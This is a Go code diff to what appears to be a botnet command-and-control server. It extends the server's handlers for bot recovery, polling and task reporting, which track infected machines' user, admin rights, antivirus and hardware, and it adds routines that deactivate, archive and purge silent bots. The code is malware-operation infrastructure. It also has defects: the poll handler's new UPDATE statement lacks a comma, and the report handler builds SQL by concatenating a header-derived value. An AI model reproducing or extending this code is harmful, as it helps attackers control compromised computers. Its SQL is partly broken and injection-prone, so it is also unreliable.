@@ -19,10 +19,71 @@ import (
 
 func TaskCleaner(db *sql.DB, interval time.Duration) {
 	go func() {
-		time.Sleep(time.Duration(interval) * time.Second)
+		time.Sleep(interval)
 		_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
 		if err != nil {
 			log.Println("Task cleanup error: " + err.Error())
+		}
+	}()
+}
+
+func DeadBotCleaner(db *sql.DB) {
+	// Create a goroutine to check inactive bot(checked per day)
+	// If bot is online [0, 7) is active and [7, 30) days is inactive, [30, ∞) is purged
+	go func() {
+		sqlStr := "update clients set status='inactive' where (lastseen >= UTC_TIMESTAMP() - INTERVAL 30 DAY) and (lastseen < UTC_TIMESTAMP() - INTERVAL 7 DAY)"
+		for {
+			time.Sleep(time.Duration(24) * time.Hour)
+			_, err := db1.Exec(db, sqlStr)
+			if err != nil {
+				log.Println("DeadBotCleaner inactive db1.Exec error: " + err.Error())
+			}
+			log.Println("DeadBotCleaner inactive db1.Exec okay ")
+		}
+	}()
+	// Create a goroutine to check archived bot(Checked per week)
+	go func() {
+		sqlStr := "insert into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
+			"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
+		sqlDeleteStr := "delete from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
+		for {
+			time.Sleep(time.Duration(24*7) * time.Hour)
+			tx, err := common.Db.Begin()
+			if err != nil {
+				log.Println("DeadBotCleaner archived tx.Begin error: " + err.Error())
+				continue
+			}
+			_, err = tx.Exec(sqlStr)
+			if err != nil {
+				tx.Rollback()
+				log.Println("DeadBotCleaner archived insert tx.Rollback error: " + err.Error())
+				continue
+			}
+			// Delete record from clients table
+			_, err = tx.Exec(sqlDeleteStr)
+			if err != nil {
+				tx.Rollback()
+				log.Println("DeadBotCleaner archived delete tx.Rollback error: " + err.Error())
+				continue
+			}
+			// Commit
+			if err = tx.Commit(); err != nil {
+				log.Println("DeadBotCleaner archived commit error: " + err.Error())
+			}
+			log.Println("DeadBotCleaner archived commit okay ")
+		}
+
+	}()
+	// Create a go routine to delete purged bot(Checked per month)
+	go func() {
+		sqlStr := `delete from clients_archived where purged_after <= UTC_TIMESTAMP()`
+		for {
+			time.Sleep(time.Duration(24*30) * time.Hour)
+			_, err := db1.Exec(db, sqlStr)
+			if err != nil {
+				log.Println("DeadBotCleaner delete error: " + err.Error())
+			}
+			log.Println("DeadBotCleaner delete okay ")
 		}
 	}()
 }
@@ -50,6 +111,7 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 
 	guid := r.Header.Get("X-Guid")
 	time1 := r.Header.Get("X-Time")
+
 	// Read bot info
 	var bot common.Client
 	utils.ReadJson(r, &bot)
@@ -72,7 +134,7 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) values(?,?,?,?,?,?,?,?,?,?,?,?)"
 		// Generate new token
 		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
-		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, time1)
+		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1))
 		if err != nil {
 			// Failed to create a bot
 			reply.Status = 0
@@ -90,7 +152,7 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 		reply.Args["Token"] = out_token
 		// Update timestamp lastseen
 		strSql = "update clients set lastseen=? where guid=?"
-		_, err = db1.Exec(common.Db, strSql, time1, out_guid)
+		_, err = db1.Exec(common.Db, strSql, utils.TimestampStringToMySqlDateTime(time1), out_guid)
 		if err != nil {
 			reply.Status = 0
 			reply.Error = "Find the bot but failed to update"
@@ -140,8 +202,40 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	reply.Status = 1
 	reply.TaskId = 0
 
-	sqlStr := "select id, guid, token, lastseen from clients where guid=?"
-	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
+	// Update the status of clients and clients_archived
+	sqlStr := "update clients set status='active' lastseen=? where guid=? and status <> 'active'"
+	db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
+
+	// Clients_archived
+	tx, err := common.Db.Begin()
+	if err != nil {
+		log.Println("tx begin err:", err.Error())
+		goto ReadyPoll
+	}
+
+	sqlStr = "insert into clients(guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) " +
+		"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, 'active' from clients_archived where guid=?"
+	_, err = tx.Exec(sqlStr, guid)
+	if err != nil {
+		tx.Rollback()
+		log.Println("tx insert err:", err.Error())
+		goto ReadyPoll
+	}
+
+	sqlStr = "delete from clients_archived where guid=?"
+	_, err = tx.Exec(sqlStr, guid)
+	if err != nil {
+		tx.Rollback()
+		log.Println("tx delete err:", err.Error())
+		goto ReadyPoll
+	}
+	if err = tx.Commit(); err != nil {
+		log.Println("tx commit err:", err.Error())
+	}
+
+ReadyPoll:
+	sqlStr = "select id, guid, token, lastseen from clients where guid=?"
+	err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
 	if err == sql.ErrNoRows {
 		// Can't find bot
 		log.Println("can't find bot in poll handler" + err.Error())
@@ -250,10 +344,8 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	if !report.Success {
 		status = "failed"
 	}
-	int64_time, _ := strconv.ParseInt(time1, 10, 64)
-	t := time.UnixMilli(int64_time)
 
-	sqlStr = "update tasks set status='" + status + "',completed_at='" + t.Format("2006-01-02 15:04:05") + "' where id=?"
+	sqlStr = "update tasks set status='" + status + "',completed_at='" + utils.TimestampStringToMySqlDateTime(time1) + "' where id=?"
 	_, err = db1.Exec(common.Db, sqlStr, report.TaskID)
 	if err != nil {
 		log.Printf("[-] Failed to update task[%s] status\n", report.TaskID)
